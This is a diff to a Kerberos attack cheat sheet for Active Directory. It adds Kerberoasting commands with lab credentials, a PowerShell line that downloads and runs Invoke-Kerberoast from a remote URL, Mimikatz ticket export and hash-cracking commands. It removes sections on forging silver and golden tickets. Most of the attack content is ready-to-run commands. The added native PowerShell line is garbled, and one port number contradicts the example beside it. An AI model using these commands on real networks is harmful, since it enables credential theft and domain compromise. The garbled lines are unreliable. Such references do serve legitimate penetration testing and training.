@@ -45,6 +45,13 @@ hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
 john --wordlist=<passwords_file> <AS_REP_responses_file>
 ```
 
+### SPN Service Principal Name Overview&#x20;
+
+* The structure of an SPN consists of three (3) main parts: **Service Class**: the service type, i.e., _SQL, Web, Exchange, File,_ etc., and the **Host** where the service is usually running in the format of **FQDN** _(Fully Qualified Domain Name)_and **port number**.&#x20;
+*   For example, below, the Microsoft SQL service runs on the **`dcorp-mgmt`** host on port 1443.
+
+    The SPN is **`MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433`**
+
 ## Kerberoasting
 
 * Great reading:
@@ -54,7 +61,10 @@ With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.
 
 ```shell
 python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
+python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 ```
+
+📌[**HackTricks Tip:**](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast) _If you find this **error** from Linux: **Kerberos SessionError: KRB\_AP\_ERR\_SKEW(Clock skew too great)** it because of your local time, you need to synchronize the host with the DC: **ntpdate \<IP of DC>**_
 
 With [Rubeus](https://github.com/GhostPack/Rubeus):
 
@@ -65,8 +75,20 @@ With [Rubeus](https://github.com/GhostPack/Rubeus):
 With **Powershell**:
 
 ```
+#Invoke-Kerberoast.ps1 IEX Method
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+#or load this way
+Import-Module .\invoke-kerberoast.ps1
+#basic command 
+Invoke-Kerberoast -Domain active.htb -OutputFormat Hashcat | fl
+#verbose command 
 Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
+```
+
+* Can also acomplish this in native powershell if you have a session&#x20;
+
+```
+Add-Type -AssemblyName System.IdentityModelNew -ObjectSystem.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "Service class\Hostname:Port"
 ```
 
 Cracking with dictionary of passwords:
@@ -75,6 +97,13 @@ Cracking with dictionary of passwords:
 hashcat -m 13100 --force <TGSs_file> <passwords_file>
 
 john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
+```
+
+### With Invoke-Mimikatz.ps1
+
+```
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
 
 ### Harvest tickets from Windows
@@ -120,102 +149,6 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 Inject ticket with [Mimikatz](https://github.com/gentilkiwi/mimikatz):
 
 ```shell
-mimikatz # kerberos::ptt <ticket_kirbi_file>
-```
-
-Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
-
-```shell
-.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
-```
-
-Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
-
-```shell
-.\PsExec.exe -accepteula \\<remote_hostname> cmd
-```
-
-## Silver ticket
-
-With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
-
-```shell
-# To generate the TGS with NTLM
-python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
-
-# To generate the TGS with AES key
-python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
-
-# Set the ticket for impacket use
-export KRB5CCNAME=<TGS_ccache_file>
-
-# Execute remote commands with any of the following by using the TGT
-python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-```
-
-With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
-
-```shell
-# To generate the TGS with NTLM
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
-
-# To generate the TGS with AES 128 key
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
-
-# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>
-
-# Inject TGS with Mimikatz
-mimikatz # kerberos::ptt <ticket_kirbi_file>
-```
-
-Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
-
-```shell
-.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
-```
-
-Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
-
-```shell
-.\PsExec.exe -accepteula \\<remote_hostname> cmd
-```
-
-## Golden ticket
-
-With [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
-
-```shell
-# To generate the TGT with NTLM
-python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
-
-# To generate the TGT with AES key
-python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
-
-# Set the ticket for impacket use
-export KRB5CCNAME=<TGS_ccache_file>
-
-# Execute remote commands with any of the following by using the TGT
-python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-```
-
-With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
-
-```shell
-# To generate the TGT with NTLM
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>
-
-# To generate the TGT with AES 128 key
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>
-
-# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
-mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>
-
-# Inject TGT with Mimikatz
 mimikatz # kerberos::ptt <ticket_kirbi_file>
 ```
 
